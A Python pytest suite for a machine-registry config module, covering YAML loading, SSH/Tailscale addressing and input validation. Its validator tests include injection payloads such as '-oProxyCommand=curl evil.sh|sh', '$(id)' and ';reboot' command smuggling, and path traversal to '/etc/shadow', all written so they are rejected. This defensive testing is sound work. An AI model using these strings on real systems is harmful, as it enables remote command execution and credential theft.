# -*- coding: utf-8 -*-
"""Regression tests for machine_config.py — 机器台账 registry + 访问地址规则。

registry 从 machines.yaml 读取（mtime 缓存），env 覆盖方向固定 env > yaml。
模块常量在 import 时读取环境变量，这类场景在子进程中验证（同 paths 测试做法）。
"""
import pathlib
import subprocess
import sys
import textwrap

import pytest

BACKEND_DIR = pathlib.Path(__file__).resolve().parent
sys.path.insert(0, str(BACKEND_DIR))

import machine_config as mc  # noqa: E402


@pytest.fixture(autouse=True)
def _clean_registry():
    """registry 是模块级 mtime 缓存，用例间必须清干净。"""
    mc.invalidate()
    yield
    mc.invalidate()


def _write_yaml(tmp_path, monkeypatch, body):
    path = tmp_path / "machines.yaml"
    path.write_text(textwrap.dedent(body), encoding="utf-8")
    monkeypatch.setenv("CONSOLE_MACHINES_PATH", str(path))
    mc.invalidate()
    return path


# ---------------------------------------------------------------------------
# load_machines — 加载 / 缓存 / fallback
# ---------------------------------------------------------------------------

class TestLoadMachines:
    def test_loads_repo_yaml(self):
        ids = mc.machine_ids()
        assert ids == ["nas", "txy", "aly", "us", "kr", "sg", "gz"]  # 保持 yaml 顺序

    def test_entry_shape(self):
        kr = mc.get_machine("kr")
        assert kr["role"] == "node"
        assert kr["public_host"] == "kr.sunxc.eu.cc"
        assert kr["probe"] == {"type": "tcp", "port": 62037}
        assert kr["traffic_quota_gb"] == 1000
        assert kr["capabilities"] == ["beszel", "ssh"]
        gz = mc.get_machine("gz")
        assert gz["role"] == "server"
        assert gz["capabilities"] == ["ssh", "docker"]
        assert mc.upgrade_config("gz") == {"enabled": True}
        assert gz["probe"] == {"type": "tcp", "port": 22}
        assert mc.ssh_target("gz") == "root@100.64.0.60"

    def test_unknown_machine_returns_none(self):
        assert mc.get_machine("router") is None
        assert mc.get_machine("") is None
        assert mc.get_machine(None) is None

    def test_repo_yaml_systemd_units_initial(self):
        """US/KR/SG 登记 sing-box；GZ 登记原生采集与 Tailscale 单元。"""
        units = {
            mid: mc.get_machine(mid)["systemd_units"] for mid in mc.machine_ids()
        }
        assert units["us"] == ["sing-box"]
        assert units["kr"] == ["sing-box"]
        assert units["sg"] == ["sing-box"]
        assert units["nas"] == []
        assert units["txy"] == []
        assert units["aly"] == []
        assert units["gz"] == ["tailscaled", "console-agent"]

    def test_lookup_normalizes_case_and_space(self):
        assert mc.get_machine("  KR ")["id"] == "kr"

    def test_second_call_uses_cache(self, tmp_path, monkeypatch):
        import os
        path = _write_yaml(tmp_path, monkeypatch, """\
            - id: nas
              role: server
            """)
        assert mc.machine_ids() == ["nas"]
        before = path.stat()
        # 文件被换掉但 mtime 复原 → 仍走缓存
        path.write_text("- id: zzz\n  role: server\n", encoding="utf-8")
        os.utime(path, (before.st_atime, before.st_mtime))
        assert mc.machine_ids() == ["nas"]
        assert mc.machine_ids(force=True) == ["zzz"]

    def test_mtime_change_reloads(self, tmp_path, monkeypatch):
        import os
        path = _write_yaml(tmp_path, monkeypatch, """\
            - id: nas
              role: server
            """)
        assert mc.machine_ids() == ["nas"]
        path.write_text("- id: txy\n  role: server\n", encoding="utf-8")
        os.utime(path, (path.stat().st_atime, path.stat().st_mtime + 10))
        assert mc.machine_ids() == ["txy"]

    def test_missing_yaml_falls_back_to_hardcoded(self, tmp_path, monkeypatch):
        monkeypatch.setenv(
            "CONSOLE_MACHINES_PATH", str(tmp_path / "nope.yaml")
        )
        mc.invalidate()
        # fallback 保住重构前的三台 docker 机器，容器动作不至于全废
        assert mc.machine_ids() == ["nas", "txy", "aly"]
        assert mc.tailscale_ip("txy") == "100.64.0.30"
        assert mc.has_capability("nas", "docker") is True

    @pytest.mark.parametrize("body", [
        "",              # 空文件
        "{}",            # 不是列表
        "- 123\n",       # 元素不是 dict
        "- label: 无 id\n",  # 缺 id
    ])
    def test_unusable_yaml_falls_back(self, tmp_path, monkeypatch, body):
        _write_yaml(tmp_path, monkeypatch, body)
        assert mc.machine_ids() == ["nas", "txy", "aly"]

    def test_broken_yaml_falls_back(self, tmp_path, monkeypatch):
        _write_yaml(tmp_path, monkeypatch, "- id: nas\n  role: [unclosed\n")
        assert mc.machine_ids() == ["nas", "txy", "aly"]

    def test_invalid_role_and_capability_dropped_not_raised(
        self, tmp_path, monkeypatch
    ):
        _write_yaml(tmp_path, monkeypatch, """\
            - id: nas
              role: wat
              capabilities: [docker, rm-rf, beszel]
            """)
        nas = mc.get_machine("nas")
        assert nas["role"] == "server"                     # 非法 role 归默认
        assert nas["capabilities"] == ["docker", "beszel"]  # 非法 capability 丢掉


# ---------------------------------------------------------------------------
# capabilities
# ---------------------------------------------------------------------------

class TestHasCapability:
    @pytest.mark.parametrize("machine,cap,expected", [
        ("nas", "docker", True),
        ("txy", "docker", True),
        ("aly", "docker", True),
        ("us", "docker", True),    # 2026-09-07 owner 拍板加回：ubuntu 已在 docker 组
        ("kr", "docker", False),
        ("sg", "docker", False),
        ("us", "ssh", True),
        ("kr", "beszel", True),
        ("router", "docker", False),  # 未知机器一律 False
        ("nas", "", False),
    ])
    def test_matrix(self, machine, cap, expected):
        assert mc.has_capability(machine, cap) is expected


# ---------------------------------------------------------------------------
# 地址与密钥
# ---------------------------------------------------------------------------

class TestAddressing:
    def test_tailscale_ip(self):
        assert mc.tailscale_ip("txy") == "100.64.0.30"
        assert mc.tailscale_ip("kr") == "100.64.0.50"
        assert mc.tailscale_ip("router") == ""

    def test_probe_host_prefers_tailscale_then_public(self, monkeypatch):
        assert mc.probe_host("txy") == "100.64.0.30"
        monkeypatch.setattr(mc, "tailscale_ip", lambda machine: "")
        assert mc.probe_host("kr") == "kr.sunxc.eu.cc"
        assert mc.probe_host("txy") == ""

    def test_ssh_target(self):
        assert mc.ssh_target("txy") == "root@100.64.0.30"
        assert mc.ssh_target("us") == "ubuntu@100.64.0.70"  # 非 root 用户
        assert mc.ssh_target("kr") == "admin@100.64.0.50"
        assert mc.ssh_target("nas") is None   # 空 = console 本机，不走 ssh
        assert mc.ssh_target("router") is None

    def test_ssh_targets_map_includes_local_nas(self):
        targets = mc.ssh_targets()
        assert targets["nas"] is None
        assert targets["kr"] == "admin@100.64.0.50"
        assert set(targets) == set(mc.machine_ids())

    def test_ssh_key_path(self):
        assert mc.ssh_key_path("kr") == f"{mc.SSH_KEY_DIR}/aws-kr.pem"
        assert mc.ssh_key_path("us") == f"{mc.SSH_KEY_DIR}/id_ed25519"
        assert mc.ssh_key_path("nas") is None   # 未配 ssh_key → 用默认密钥
        assert mc.ssh_key_path("router") is None

    def test_ssh_key_path_rejects_path_traversal(self, tmp_path, monkeypatch):
        _write_yaml(tmp_path, monkeypatch, """\
            - id: nas
              role: server
              ssh_key: ../../etc/shadow
            """)
        assert mc.ssh_key_path("nas") is None


# ---------------------------------------------------------------------------
# beszel_name 映射 / assets 漂移
# ---------------------------------------------------------------------------

class TestBeszelNameMap:
    def test_map_is_upper_to_id(self):
        m = mc.beszel_name_map()
        assert m["NAS"] == "nas"
        assert m["KR"] == "kr"
        assert m["US"] == "us"

    def test_falls_back_to_upper_id_when_unset(self, tmp_path, monkeypatch):
        _write_yaml(tmp_path, monkeypatch, """\
            - id: nas
              role: server
            """)
        assert mc.beszel_name_map() == {"NAS": "nas"}


class TestUnknownMachineIds:
    def test_reports_ids_not_in_registry(self):
        services = [
            {"name": "a", "machine": "nas"},
            {"name": "b", "machine": "kr"},
            {"name": "c", "machine": "router"},
            {"name": "d", "machine": "oldbox"},
        ]
        assert mc.unknown_machine_ids(services) == ["oldbox", "router"]

    def test_empty_and_missing_machine_ignored(self):
        assert mc.unknown_machine_ids([]) == []
        assert mc.unknown_machine_ids([{"name": "a"}, {"machine": ""}]) == []

    def test_not_a_list_is_safe(self):
        assert mc.unknown_machine_ids(None) == []
        assert mc.unknown_machine_ids("nope") == []


# ---------------------------------------------------------------------------
# machines_for_api — §4.2 字段集
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# systemd_units 展示白名单（Track J §4.1）——读路径宽容归一化
# ---------------------------------------------------------------------------

class TestSystemdUnitsRead:
    """§4.1：字符串数组、trim/去重/保序、最多 32 项、每项 1–128 字符。

    读路径宽容：坏类型降级空数组、非法项丢弃，一条坏数据不打死 registry。
    unit 以 Beszel systemd_services.name 原样精确匹配，大小写敏感，不补 .service。
    """

    def _load(self, tmp_path, monkeypatch, units_line):
        body = "- id: kr\n  role: node\n  public_host: kr.sunxc.eu.cc\n"
        if units_line is not None:
            body += f"  systemd_units: {units_line}\n"
        _write_yaml(tmp_path, monkeypatch, body)
        return mc.get_machine("kr")

    def test_valid_array_trim_dedup_keep_order(self, tmp_path, monkeypatch):
        kr = self._load(
            tmp_path, monkeypatch,
            '[" sing-box ", "sing-box", "foo@bar.service"]',
        )
        assert kr["systemd_units"] == ["sing-box", "foo@bar.service"]

    def test_missing_field_is_empty_list(self, tmp_path, monkeypatch):
        assert self._load(tmp_path, monkeypatch, None)["systemd_units"] == []

    @pytest.mark.parametrize("bad", ['"sing-box"', "123", "{}", "true"])
    def test_non_list_degrades_to_empty(self, tmp_path, monkeypatch, bad):
        assert self._load(tmp_path, monkeypatch, bad)["systemd_units"] == []

    def test_empty_list_is_empty(self, tmp_path, monkeypatch):
        assert self._load(tmp_path, monkeypatch, "[]")["systemd_units"] == []

    def test_invalid_items_dropped(self, tmp_path, monkeypatch):
        kr = self._load(
            tmp_path, monkeypatch,
            '["", "  ", "a b", "evil$(id)", "a\\tb", "ok.service"]',
        )
        assert kr["systemd_units"] == ["ok.service"]

    def test_overlong_item_dropped(self, tmp_path, monkeypatch):
        kr = self._load(
            tmp_path, monkeypatch,
            str(["x" * 129, "sing-box"]),
        )
        assert kr["systemd_units"] == ["sing-box"]

    def test_non_string_items_dropped(self, tmp_path, monkeypatch):
        kr = self._load(tmp_path, monkeypatch, '[123, null, "sing-box"]')
        assert kr["systemd_units"] == ["sing-box"]

    def test_case_sensitive_no_lowercasing(self, tmp_path, monkeypatch):
        kr = self._load(tmp_path, monkeypatch, '["Sing-Box", "sing-box"]')
        assert kr["systemd_units"] == ["Sing-Box", "sing-box"]

    def test_capped_at_32_items(self, tmp_path, monkeypatch):
        kr = self._load(
            tmp_path, monkeypatch,
            str([f"unit-{i:02d}" for i in range(33)]),
        )
        assert kr["systemd_units"] == [f"unit-{i:02d}" for i in range(32)]


class TestMachinesForApi:
    def test_fields_and_no_secrets_leaked(self):
        rows = mc.machines_for_api()
        assert [r["id"] for r in rows] == mc.machine_ids()
        kr = next(r for r in rows if r["id"] == "kr")
        assert kr["label"] == "光帆 KR"
        assert kr["role"] == "node"
        assert kr["provider"] == "AWS Lightsail 韩国"
        assert kr["capabilities"] == ["beszel", "ssh"]
        assert kr["traffic_quota_gb"] == 1000
        # 地址与密钥不出接口
        for row in rows:
            assert "tailscale" not in row
            assert "ssh" not in row
            assert "ssh_key" not in row

    def test_os_and_region_exposed(self):
        rows = {r["id"]: r for r in mc.machines_for_api()}
        assert rows["nas"]["os"] == "Debian 12"
        assert rows["nas"]["region"] == "🇨🇳"
        assert rows["txy"]["os"] == "Ubuntu 24.04"
        assert rows["txy"]["region"] == "🇨🇳"
        assert rows["aly"]["os"] == "Ubuntu 22.04"
        assert rows["aly"]["region"] == "🇨🇳"
        assert rows["us"]["os"] == "Ubuntu 24.04 ARM"
        assert rows["us"]["region"] == "🇺🇸"
        assert rows["kr"]["os"] == "Debian 13"
        assert rows["kr"]["region"] == "🇰🇷"
        assert rows["sg"]["os"] == "Debian 12"
        assert rows["sg"]["region"] == "🇸🇬"

    def test_quota_and_probe_per_machine(self):
        rows = {r["id"]: r for r in mc.machines_for_api()}
        # Q1/Q2 配额初值：txy/aly 300、us 10000、kr/sg 1000；nas 无配额
        assert rows["nas"]["traffic_quota_gb"] is None
        assert rows["txy"]["traffic_quota_gb"] == 300
        assert rows["aly"]["traffic_quota_gb"] == 300
        assert rows["us"]["traffic_quota_gb"] == 10000
        assert rows["kr"]["traffic_quota_gb"] == 1000
        assert rows["sg"]["traffic_quota_gb"] == 1000
        # Q3：server 也有 probe（tcp 22），嵌套形状与 §4.1 一致
        assert rows["nas"]["probe"] == {"type": "tcp", "port": 22}
        assert rows["txy"]["probe"] == {"type": "tcp", "port": 22}
        assert rows["kr"]["probe"] == {"type": "tcp", "port": 62037}

    def test_probe_dict_is_a_copy_not_registry_reference(self):
        rows = {r["id"]: r for r in mc.machines_for_api()}
        rows["kr"]["probe"]["port"] = 1
        assert mc.get_machine("kr")["probe"]["port"] == 62037


# ---------------------------------------------------------------------------
# suggest_access — D5：路径不动，行为必须与重构前一致
# ---------------------------------------------------------------------------

class TestSuggestAccess:
    @pytest.mark.parametrize("port", [None, "", 0, "abc", []])
    def test_missing_or_invalid_port_returns_empty(self, port):
        assert mc.suggest_access("nas", port) == {"home": "", "tailscale": ""}

    def test_home_machine_gets_both_urls(self):
        result = mc.suggest_access("nas", 8081)
        assert result["home"] == f"http://{mc.HOME_LAN_IP}:8081"
        assert result["tailscale"] == f"http://{mc.tailscale_ip('nas')}:8081"

    def test_remote_machine_has_no_home_url(self):
        result = mc.suggest_access("txy", 8080)
        assert result["home"] == ""
        assert result["tailscale"] == f"http://{mc.tailscale_ip('txy')}:8080"

    def test_unknown_machine_returns_empty_urls(self):
        assert mc.suggest_access("router", 80) == {"home": "", "tailscale": ""}

    def test_machine_defaults_to_nas(self):
        assert mc.suggest_access(None, 80) == mc.suggest_access("nas", 80)

    def test_machine_case_and_whitespace_normalized(self):
        assert mc.suggest_access("  NAS ", 80) == mc.suggest_access("nas", 80)

    def test_port_accepts_numeric_string(self):
        result = mc.suggest_access("nas", "9000")
        assert result["home"].endswith(":9000")

    def test_home_machine_without_tailscale_ip(self, monkeypatch):
        # win 在 HOME_MACHINES 内但默认无 Tailscale IP → 仅家庭入口
        monkeypatch.setitem(mc._EXTRA_TAILSCALE, "win", "")
        result = mc.suggest_access("win", 3389)
        assert result["home"] == f"http://{mc.HOME_LAN_IP}:3389"
        assert result["tailscale"] == ""

    def test_node_machine_is_not_a_home_machine(self):
        # D5：kr/sg 进 registry 但不属于家庭机器，不该长出 home 入口
        assert mc.suggest_access("kr", 62037)["home"] == ""


class TestSuggestAccessSuffix:
    @pytest.mark.parametrize("suffix,expected", [
        ("", ""),
        (None, ""),
        ("admin", "/admin"),
        ("/admin", "/admin"),
        ("#/dashboard", "/#/dashboard"),
    ])
    def test_suffix_normalization(self, suffix, expected):
        result = mc.suggest_access("nas", 8081, suffix)
        assert result["home"] == f"http://{mc.HOME_LAN_IP}:8081{expected}"
        assert result["tailscale"].endswith(f":8081{expected}")


# ---------------------------------------------------------------------------
# machines_for_config
# ---------------------------------------------------------------------------

class TestMachinesForConfig:
    def test_shape_and_sorted_home_machines(self):
        cfg = mc.machines_for_config()
        assert set(cfg) == {
            "home_lan_ip", "home_machines", "tailscale", "roles",
        }
        assert cfg["home_lan_ip"] == mc.HOME_LAN_IP
        assert cfg["home_machines"] == sorted(mc.HOME_MACHINES)
        assert cfg["roles"]["kr"] == "node"
        assert cfg["roles"]["nas"] == "server"

    def test_tailscale_excludes_empty_entries(self, monkeypatch):
        monkeypatch.setitem(mc._EXTRA_TAILSCALE, "win", "")
        cfg = mc.machines_for_config()
        assert "win" not in cfg["tailscale"]
        assert all(v for v in cfg["tailscale"].values())


# ---------------------------------------------------------------------------
# validate_machine_payload — 写路径校验（B3 §5.3）
# ---------------------------------------------------------------------------

def _payload(**over):
    base = {
        "id": "hk",
        "label": "香港 HK",
        "role": "node",
        "public_host": "hk.example.com",
        "capabilities": ["ssh"],
    }
    base.update(over)
    return base


class TestValidateMachinePayload:
    def test_minimal_node_payload(self):
        entry = mc.validate_machine_payload(_payload())
        assert entry["id"] == "hk"
        assert entry["role"] == "node"
        # 未填的字段规范化成空值，而不是缺键
        assert entry["provider"] == ""
        assert entry["probe"] is None
        assert entry["traffic_quota_gb"] is None
        # label 缺省回落成大写 id，beszel_name 同理
        assert mc.validate_machine_payload(_payload(label=""))["label"] == "HK"
        assert entry["beszel_name"] == "HK"

    def test_id_normalized_to_lowercase(self):
        assert mc.validate_machine_payload(_payload(id="  HK "))["id"] == "hk"

    @pytest.mark.parametrize("bad", ["", "a b", "../etc", "-hk", "机器"])
    def test_bad_id_rejected(self, bad):
        with pytest.raises(ValueError):
            mc.validate_machine_payload(_payload(id=bad))

    @pytest.mark.parametrize("home", ["mac", "win", "MAC"])
    def test_home_machines_rejected(self, home):
        """D5：mac/win 是家庭入口概念，不进 machines.yaml。"""
        with pytest.raises(ValueError, match="家庭入口"):
            mc.validate_machine_payload(_payload(id=home))

    def test_nas_is_editable(self):
        """nas 同在 HOME_MACHINES 里，但它是台账内的 server，必须可编辑。"""
        entry = mc.validate_machine_payload(
            _payload(id="nas", role="server", public_host="", capabilities=["docker"])
        )
        assert entry["id"] == "nas"

    def test_role_must_be_valid(self):
        with pytest.raises(ValueError, match="role"):
            mc.validate_machine_payload(_payload(role="router"))
        with pytest.raises(ValueError, match="role"):
            mc.validate_machine_payload(_payload(role=""))

    def test_unknown_capability_rejected_not_silently_dropped(self):
        """读路径静默丢弃非法能力，写路径必须报错——否则用户看不出被改掉了。"""
        with pytest.raises(ValueError, match="未知能力"):
            mc.validate_machine_payload(_payload(capabilities=["docker", "k8s"]))

    def test_capabilities_dedup_and_lowercase(self):
        entry = mc.validate_machine_payload(
            _payload(capabilities=["SSH", "ssh", "Beszel"])
        )
        assert entry["capabilities"] == ["ssh", "beszel"]

    def test_probe_port_range(self):
        entry = mc.validate_machine_payload(_payload(probe={"port": 62037}))
        assert entry["probe"] == {"type": "tcp", "port": 62037}
        with pytest.raises(ValueError, match="端口范围"):
            mc.validate_machine_payload(_payload(probe={"port": 70000}))
        with pytest.raises(ValueError, match="只支持 tcp"):
            mc.validate_machine_payload(_payload(probe={"type": "http", "port": 80}))
        # 空 port 视为不配探测，而不是报错
        assert mc.validate_machine_payload(_payload(probe={"port": ""}))["probe"] is None

    def test_quota_integer_and_non_negative(self):
        assert mc.validate_machine_payload(_payload(traffic_quota_gb="1000"))[
            "traffic_quota_gb"
        ] == 1000
        assert mc.validate_machine_payload(_payload(traffic_quota_gb=""))[
            "traffic_quota_gb"
        ] is None
        with pytest.raises(ValueError, match="负数"):
            mc.validate_machine_payload(_payload(traffic_quota_gb=-1))
        with pytest.raises(ValueError, match="整数"):
            mc.validate_machine_payload(_payload(traffic_quota_gb="很多"))

    def test_tailscale_must_be_ip(self):
        entry = mc.validate_machine_payload(_payload(tailscale="100.64.0.50"))
        assert entry["tailscale"] == "100.64.0.50"
        with pytest.raises(ValueError, match="IP 地址"):
            mc.validate_machine_payload(_payload(tailscale="kr.example.com"))

    @pytest.mark.parametrize(
        "bad",
        [
            # 首字符 `-` 会被 ssh 当选项解析：-oProxyCommand=... 可执行任意命令
            "-oProxyCommand=curl evil.sh|sh",
            "root@host -oProxyCommand=x",
            "root@host;id",
            "root@host$(id)",
            "root@host\nid",
        ],
    )
    def test_ssh_target_injection_rejected(self, bad):
        with pytest.raises(ValueError, match="ssh"):
            mc.validate_machine_payload(_payload(ssh=bad))

    def test_ssh_target_accepts_user_at_host(self):
        assert mc.validate_machine_payload(_payload(ssh="admin@100.64.0.50"))["ssh"] == (
            "admin@100.64.0.50"
        )
        # 空串有语义：nas 是 console 本机，不走 SSH
        assert mc.validate_machine_payload(_payload(ssh=""))["ssh"] == ""

    @pytest.mark.parametrize("bad", ["../id_rsa", "/root/.ssh/id_rsa", "sub/key.pem"])
    def test_ssh_key_path_traversal_rejected(self, bad):
        """私钥只收 .ssh-console/ 内纯文件名（§5.3 红线）。"""
        with pytest.raises(ValueError, match="ssh_key"):
            mc.validate_machine_payload(_payload(ssh_key=bad))

    def test_ssh_key_filename_accepted(self):
        assert mc.validate_machine_payload(_payload(ssh_key="aws-kr.pem"))["ssh_key"] == (
            "aws-kr.pem"
        )

    def test_public_host_rejects_junk(self):
        for bad in ("http://kr.example.com", "kr example", "-kr.example.com"):
            with pytest.raises(ValueError, match="public_host"):
                mc.validate_machine_payload(_payload(public_host=bad))

    def test_node_needs_a_probe_target(self):
        with pytest.raises(ValueError, match="public_host 或 tailscale"):
            mc.validate_machine_payload(_payload(public_host="", tailscale=""))
        # server 允许两者都空（nas：本机 + 由 env 提供 TS 位）
        assert mc.validate_machine_payload(
            _payload(id="box", role="server", public_host="", tailscale="")
        )["id"] == "box"

    def test_free_text_limits_and_control_chars(self):
        with pytest.raises(ValueError, match="控制字符"):
            mc.validate_machine_payload(_payload(label="光帆\nKR"))
        with pytest.raises(ValueError, match="长度"):
            mc.validate_machine_payload(_payload(label="x" * 65))

    def test_renewal_ref_accepts_uuid_and_readable_id(self):
        uuid_ref = "85627f2c-8797-4a5b-bad0-50a2529a58da"
        assert mc.validate_machine_payload(_payload(renewal_ref=uuid_ref))[
            "renewal_ref"
        ] == uuid_ref
        assert mc.validate_machine_payload(_payload(renewal_ref="node-kr"))[
            "renewal_ref"
        ] == "node-kr"
        with pytest.raises(ValueError, match="renewal_ref"):
            mc.validate_machine_payload(_payload(renewal_ref="node kr"))


# ---------------------------------------------------------------------------
# systemd_units 写路径严格校验（Track J §4.1 / §6 B2）
# ---------------------------------------------------------------------------

class TestSystemdUnitsWrite:
    """写路径与读路径相反：非法值必须中文 400（ValueError），不能静默改掉。"""

    def test_valid_units_trim_dedup_keep_order(self):
        entry = mc.validate_machine_payload(
            _payload(systemd_units=[" sing-box ", "sing-box", "foo@bar.service"])
        )
        assert entry["systemd_units"] == ["sing-box", "foo@bar.service"]

    def test_missing_and_empty_become_empty_list(self):
        assert mc.validate_machine_payload(_payload())["systemd_units"] == []
        assert mc.validate_machine_payload(_payload(systemd_units=[]))[
            "systemd_units"
        ] == []

    @pytest.mark.parametrize("bad", [None, ""])
    def test_explicit_null_or_blank_rejected(self, bad):
        with pytest.raises(ValueError, match="不能为 null 或空字符串"):
            mc.validate_machine_payload(_payload(systemd_units=bad))

    @pytest.mark.parametrize("bad", ["sing-box", 123, {"a": 1}, True])
    def test_non_list_rejected(self, bad):
        with pytest.raises(ValueError, match="systemd_units 必须是列表"):
            mc.validate_machine_payload(_payload(systemd_units=bad))

    def test_more_than_32_rejected(self):
        with pytest.raises(ValueError, match="32"):
            mc.validate_machine_payload(
                _payload(systemd_units=[f"unit-{i:02d}" for i in range(33)])
            )

    @pytest.mark.parametrize("empty", ["", "   "])
    def test_empty_item_rejected(self, empty):
        with pytest.raises(ValueError, match="不能为空"):
            mc.validate_machine_payload(
                _payload(systemd_units=["sing-box", empty])
            )

    def test_over_128_chars_rejected(self):
        with pytest.raises(ValueError, match="128"):
            mc.validate_machine_payload(_payload(systemd_units=["x" * 129]))

    @pytest.mark.parametrize(
        "bad", ["a b", "evil$(id)", "a\tb", "a\nb", "nginx;reboot", "单 元", "a/b"]
    )
    def test_invalid_chars_rejected(self, bad):
        with pytest.raises(ValueError, match="systemd unit"):
            mc.validate_machine_payload(_payload(systemd_units=[bad]))

    def test_non_string_item_rejected(self):
        with pytest.raises(ValueError, match="systemd unit"):
            mc.validate_machine_payload(_payload(systemd_units=[123]))

    def test_dedup_keeps_first_occurrence_order(self):
        entry = mc.validate_machine_payload(
            _payload(systemd_units=["b.service", "a", "b.service", "a"])
        )
        assert entry["systemd_units"] == ["b.service", "a"]


class TestSystemdUnitsRoundTrip:
    """validate → _to_yaml_entry → yaml 落盘 → load 回读的完整 round-trip。"""

    def _upsert(self, tmp_path, monkeypatch, units):
        _write_yaml(tmp_path, monkeypatch, "- id: kr\n  role: node\n")
        return mc.upsert_machine(
            _payload(id="kr", systemd_units=units), machine_id="kr"
        )

    def test_sing_box_round_trip(self, tmp_path, monkeypatch):
        self._upsert(tmp_path, monkeypatch, ["sing-box"])
        assert mc.get_machine("kr")["systemd_units"] == ["sing-box"]
        text = (tmp_path / "machines.yaml").read_text(encoding="utf-8")
        assert "systemd_units:" in text
        assert "- sing-box" in text

    def test_foo_at_bar_service_round_trip(self, tmp_path, monkeypatch):
        self._upsert(tmp_path, monkeypatch, ["foo@bar.service"])
        assert mc.get_machine("kr")["systemd_units"] == ["foo@bar.service"]

    def test_empty_list_omitted_from_yaml(self, tmp_path, monkeypatch):
        """空数组走 omit 语义：yaml 数据里不留 `systemd_units:` 尾巴。

        注意契约头（MACHINES_HEADER）本身含 systemd_units 字样，断言的是带冒号的数据键行。
        """
        self._upsert(tmp_path, monkeypatch, [])
        text = (tmp_path / "machines.yaml").read_text(encoding="utf-8")
        assert "systemd_units:" not in text
        assert mc.get_machine("kr")["systemd_units"] == []

    def test_invalid_payload_does_not_touch_yaml(self, tmp_path, monkeypatch):
        path = self._upsert(tmp_path, monkeypatch, ["sing-box"])  # noqa: F841
        before = (tmp_path / "machines.yaml").read_text(encoding="utf-8")
        with pytest.raises(ValueError):
            mc.upsert_machine(
                _payload(id="kr", systemd_units=["evil$(id)"]), machine_id="kr"
            )
        assert (tmp_path / "machines.yaml").read_text(encoding="utf-8") == before


# ---------------------------------------------------------------------------
# upsert_machine / delete_machine — yaml 写回（B3 §5.3）
# ---------------------------------------------------------------------------

class TestUpsertMachine:
    @pytest.fixture()
    def yaml_path(self, tmp_path, monkeypatch):
        return _write_yaml(
            tmp_path,
            monkeypatch,
            """\
            - id: kr
              label: 光帆 KR
              role: node
              public_host: kr.sunxc.eu.cc
              tailscale: 100.64.0.50
              ssh: admin@100.64.0.50
              ssh_key: aws-kr.pem
              capabilities: [beszel, ssh]
              probe: { type: tcp, port: 62037 }
              traffic_quota_gb: 1000
              renewal_ref: node-kr
            """,
        )

    def test_create_appends_and_reloads(self, yaml_path):
        mc.upsert_machine(_payload(), create=True)
        assert mc.machine_ids() == ["kr", "hk"]  # 追加在末尾，保持顺序
        assert mc.get_machine("hk")["public_host"] == "hk.example.com"

    def test_create_rejects_duplicate(self, yaml_path):
        with pytest.raises(ValueError, match="已存在"):
            mc.upsert_machine(_payload(id="kr"), create=True)

    def test_update_requires_existing(self, yaml_path):
        with pytest.raises(ValueError, match="不存在"):
            mc.upsert_machine(_payload(id="hk"), machine_id="hk")

    def test_update_overwrites_fields(self, yaml_path):
        mc.upsert_machine(
            _payload(
                id="kr",
                label="光帆 KR（改）",
                role="node",
                public_host="kr2.sunxc.eu.cc",
                capabilities=["beszel", "ssh"],
                traffic_quota_gb=2000,
            ),
            machine_id="kr",
        )
        kr = mc.get_machine("kr")
        assert kr["label"] == "光帆 KR（改）"
        assert kr["public_host"] == "kr2.sunxc.eu.cc"
        assert kr["traffic_quota_gb"] == 2000
        # 表单没提交的字段按提交值走（空 = 清空），不留旧值幽灵
        assert kr["ssh"] == ""

    def test_rename_rejected(self, yaml_path):
        """id 是 assets.yaml / probe 时序 / 流量账本的关联键，改名会孤儿化历史。"""
        with pytest.raises(ValueError, match="不支持改机器 id"):
            mc.upsert_machine(_payload(id="kr2"), machine_id="kr")

    def test_header_preserved_after_write(self, yaml_path):
        mc.upsert_machine(_payload(), create=True)
        text = yaml_path.read_text(encoding="utf-8")
        assert text.startswith("# 机器台账")
        assert "renewal_ref 指向权威 PostgreSQL" in text  # 换机/重建库后的引用陷阱提示不能被写掉

    def test_empty_fields_omitted_from_yaml(self, yaml_path):
        mc.upsert_machine(_payload(), create=True)
        text = yaml_path.read_text(encoding="utf-8")
        assert "provider: ''" not in text
        assert "traffic_nic: ''" not in text
        # ssh 空串有语义（本机执行），必须落盘
        assert "ssh: ''" in text

    def test_unknown_hand_written_keys_survive_update(self, tmp_path, monkeypatch):
        _write_yaml(
            tmp_path,
            monkeypatch,
            """\
            - id: kr
              label: 光帆 KR
              role: node
              public_host: kr.sunxc.eu.cc
              capabilities: [ssh]
              future_field: keep-me
            """,
        )
        mc.upsert_machine(
            _payload(id="kr", label="改名", public_host="kr.sunxc.eu.cc"),
            machine_id="kr",
        )
        raw = {e["id"]: e for e in mc.load_machines_raw()}
        assert raw["kr"]["future_field"] == "keep-me"

    def test_invalid_payload_does_not_touch_yaml(self, yaml_path):
        before = yaml_path.read_text(encoding="utf-8")
        with pytest.raises(ValueError):
            mc.upsert_machine(_payload(role="router"), create=True)
        assert yaml_path.read_text(encoding="utf-8") == before


class TestDeleteMachine:
    @pytest.fixture()
    def yaml_path(self, tmp_path, monkeypatch):
        return _write_yaml(
            tmp_path,
            monkeypatch,
            """\
            - id: kr
              label: 光帆 KR
              role: node
              public_host: kr.sunxc.eu.cc
              capabilities: [ssh]
            - id: sg
              label: 光帆 SG
              role: node
              public_host: sg.sunxc.eu.cc
              capabilities: [ssh]
            """,
        )

    def test_delete_removes_entry(self, yaml_path):
        mc.delete_machine("kr")
        assert mc.machine_ids() == ["sg"]

    def test_delete_unknown_raises(self, yaml_path):
        with pytest.raises(ValueError, match="不存在"):
            mc.delete_machine("hk")

    def test_delete_normalizes_id(self, yaml_path):
        mc.delete_machine("  KR ")
        assert mc.machine_ids() == ["sg"]

    def test_delete_last_machine_leaves_empty_list_not_fallback(self, yaml_path):
        """删空后 yaml 是空列表；load_machines 会回落硬编码，但 raw 必须是空的。"""
        mc.delete_machine("kr")
        mc.delete_machine("sg")
        assert mc.load_machines_raw() == []


class TestServicesOnMachine:
    def test_lists_services_attached_to_machine(self):
        services = [
            {"name": "axonhub", "machine": "txy"},
            {"name": "gitea", "machine": "NAS"},
            {"name": "vault", "machine": "nas"},
            {"name": "orphan"},
            "not-a-dict",
        ]
        assert mc.services_on_machine(services, "nas") == ["gitea", "vault"]
        assert mc.services_on_machine(services, "txy") == ["axonhub"]
        assert mc.services_on_machine(services, "kr") == []
        assert mc.services_on_machine(None, "nas") == []

    def test_unnamed_service_still_counted(self):
        assert mc.services_on_machine([{"machine": "kr"}], "kr") == ["(未命名)"]


# ---------------------------------------------------------------------------
